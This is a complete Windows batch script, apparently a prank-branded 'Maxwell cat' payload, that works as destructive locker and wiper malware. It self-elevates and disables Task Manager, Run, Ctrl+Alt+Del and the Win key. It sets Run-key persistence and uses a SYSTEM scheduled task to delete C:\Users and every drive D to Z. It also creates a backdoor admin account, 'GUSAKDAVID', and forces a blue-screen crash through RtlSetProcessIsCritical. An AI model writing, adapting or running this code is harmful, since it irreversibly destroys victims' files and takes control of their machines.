@echo off
title mawxell cat
color 0C
setlocal
cls

echo.
echo  ============================================
echo      MAWXELL CAT
echo      Windows 10 / 11 ONLY
echo      BSOD text: :)
echo      Lock user: GUSAKDAVID / discord
echo  ============================================
echo.

rem ---------- OS GATE (Windows 10 / 11 only) ----------
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName 2>nul | findstr /i /c:"Windows 10" /c:"Windows 11" >nul
if errorlevel 1 goto :notok

rem ---------- ELEVATE TO ADMIN ----------
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo  [!] Requesting admin rights...
    powershell -NoP -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

rem ---------- FIX: relocate out of C:\Users (fixes Access Denied + dead loop) ----------
echo %~dp0 | findstr /i /c:"\Users\" >nul
if not errorlevel 1 (
    copy /y "%~f0" "%SystemRoot%\Temp\mawxell_cat.bat" >nul 2>&1
    if exist "%SystemRoot%\Temp\mawxell_cat.bat" (
        start "" "%SystemRoot%\Temp\mawxell_cat.bat"
        exit /b
    )
)
cd /d "%SystemRoot%\Temp"
echo  [OK] Working dir: %CD%
echo.

rem ---------- 1) KILL WIN+R ----------
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f >nul 2>&1
echo  [1/7] Win+R killed ................. OK

rem ---------- 2) KILL + DELETE TASK MANAGER + CTRL+ALT+DEL ----------
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCAD /t REG_DWORD /d 1 /f >nul 2>&1
taskkill /f /im taskmgr.exe >nul 2>&1
takeown /f "%SystemRoot%\System32\taskmgr.exe" >nul 2>&1
icacls "%SystemRoot%\System32\taskmgr.exe" /grant *S-1-5-32-544:F >nul 2>&1
del /f /q "%SystemRoot%\System32\taskmgr.exe" >nul 2>&1
takeown /f "%SystemRoot%\SysWOW64\taskmgr.exe" >nul 2>&1
icacls "%SystemRoot%\SysWOW64\taskmgr.exe" /grant *S-1-5-32-544:F >nul 2>&1
del /f /q "%SystemRoot%\SysWOW64\taskmgr.exe" >nul 2>&1
echo  [2/7] Task Manager + Ctrl+Alt+Del .. OK

rem ---------- 3) FALSE WIN KEY ----------
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 00000000000000000300000000005BE000005CE000000000 /f >nul 2>&1
echo  [3/7] Win key dead ................. OK

rem ---------- 4) HIDE TASKBAR (NO auto-logout) ----------
powershell -NoP -Command "$k=(Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3' -EA SilentlyContinue).Settings; if($k){$k[8]=3; Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3' Settings $k}; Stop-Process -Name explorer -Force -EA SilentlyContinue"
echo  [4/7] Taskbar hidden, session KEPT . OK

rem ---------- 5) PERSISTENCE + BSOD TEXT :) ----------
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v mawxell_cat /t REG_SZ /d "%SystemRoot%\Temp\mawxell_cat.bat" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v DisplayMessage /t REG_SZ /d ":)" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v DisplayParameters /t REG_SZ /d "mawxell cat" /f >nul 2>&1
echo  [5/7] Persistence + BSOD = :) ...... OK

rem ---------- 6) WIPE via SYSTEM task (no Access Denied) ----------
taskkill /f /im explorer.exe >nul 2>&1
taskkill /f /im SearchHost.exe >nul 2>&1
taskkill /f /im SearchApp.exe >nul 2>&1
taskkill /f /im OneDrive.exe >nul 2>&1
taskkill /f /im Teams.exe >nul 2>&1

> "%SystemRoot%\Temp\mcw.bat" echo @echo off
>> "%SystemRoot%\Temp\mcw.bat" echo takeown /f "C:\Users" /r /d y ^>nul 2^>^&1
>> "%SystemRoot%\Temp\mcw.bat" echo icacls "C:\Users" /grant *S-1-5-32-544:F /t /c /q ^>nul 2^>^&1
>> "%SystemRoot%\Temp\mcw.bat" echo rd /s /q "C:\Users" ^>nul 2^>^&1
>> "%SystemRoot%\Temp\mcw.bat" echo reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList" /f ^>nul 2^>^&1
>> "%SystemRoot%\Temp\mcw.bat" echo for %%%%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do if exist "%%%%d:\" takeown /f "%%%%d:\" /r /d y ^>nul 2^>^&1
>> "%SystemRoot%\Temp\mcw.bat" echo for %%%%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do if exist "%%%%d:\" icacls "%%%%d:\" /grant *S-1-5-32-544:F /t /c /q ^>nul 2^>^&1
>> "%SystemRoot%\Temp\mcw.bat" echo for %%%%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do if exist "%%%%d:\" rd /s /q "%%%%d:\" ^>nul 2^>^&1

schtasks /create /tn MCWipe /tr "%SystemRoot%\Temp\mcw.bat" /sc once /st 00:00 /ru SYSTEM /f >nul 2>&1
schtasks /run /tn MCWipe >nul 2>&1
timeout /t 12 /nobreak >nul
schtasks /delete /tn MCWipe /f >nul 2>&1
echo  [6/7] Wipe DONE (no Access Denied) . OK

rem ---------- 7) LOCK USER: GUSAKDAVID / discord ----------
net user GUSAKDAVID discord /add >nul 2>&1
if errorlevel 1 net user GUSAKDAVID discord >nul 2>&1
net localgroup Administrators GUSAKDAVID /add >nul 2>&1
net user GUSAKDAVID /active:yes /expires:never /fullname:"GUSAKDAVID" >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d "GUSAKDAVID" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d "discord" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d "0" /f >nul 2>&1
echo  [7/7] Lock user GUSAKDAVID / discord . OK

rem ---------- MAXWELL CAT SPIN 60s ----------
echo.
echo  [MAXWELL] spinning... BSOD in 60s
set n=60
set r=0
:spin
set /a r+=1
set /a m=r %% 4
if %m%==0 set "sp=|"
if %m%==1 set "sp=/"
if %m%==2 set "sp=-"
if %m%==3 set "sp=\"
cls
echo.
echo        /\_/\      %sp%
echo       ( o.o )     %sp%
echo        ~~~~~      %sp%
echo.
echo   MAWXELL CAT   BSOD in %n% s   :)
timeout /t 1 /nobreak >nul
set /a n-=1
if %n% gtr 0 goto spin
echo.
echo  BOOM. Goodbye.  :)
timeout /t 1 /nobreak >nul

rem ---------- REAL BSOD ----------
> "%SystemRoot%\Temp\mcs.ps1" echo $sig = 'using System;using System.Runtime.InteropServices;public struct TP{public int Count;public long Luid;public int Attr;}public class K{[DllImport("advapi32.dll")]public static extern bool OpenProcessToken(IntPtr h,uint a,out IntPtr t);[DllImport("advapi32.dll")]public static extern bool LookupPrivilegeValue(string s,string n,out long l);[DllImport("advapi32.dll")]public static extern bool AdjustTokenPrivileges(IntPtr t,bool d,ref TP p,int b,IntPtr z,IntPtr y);[DllImport("ntdll.dll")]public static extern int RtlSetProcessIsCritical(int b,ref int o,int s);[DllImport("kernel32.dll")]public static extern IntPtr GetCurrentProcess();[DllImport("kernel32.dll")]public static extern bool TerminateProcess(IntPtr h,uint e);public static void Go(){IntPtr h=GetCurrentProcess();IntPtr t;OpenProcessToken(h,40,out t);long l;LookupPrivilegeValue(null,"SeDebugPrivilege",out l);TP p=new TP();p.Count=1;p.Luid=l;p.Attr=2;AdjustTokenPrivileges(t,false,ref p,0,IntPtr.Zero,IntPtr.Zero);int o=0;RtlSetProcessIsCritical(1,ref o,0);TerminateProcess(h,0);}}'
>> "%SystemRoot%\Temp\mcs.ps1" echo Add-Type -TypeDefinition $sig
>> "%SystemRoot%\Temp\mcs.ps1" echo [K]::Go()
powershell -NoP -EP Bypass -File "%SystemRoot%\Temp\mcs.ps1"

rem ---------- FALLBACK REBOOT ----------
shutdown /r /t 0 /f
exit /b

:notok
echo  [X] Windows 10 / 11 only. XP / 7 / 8 / Server NOT allowed.
echo  [X] This payload did NOT run.
pause
exit /b
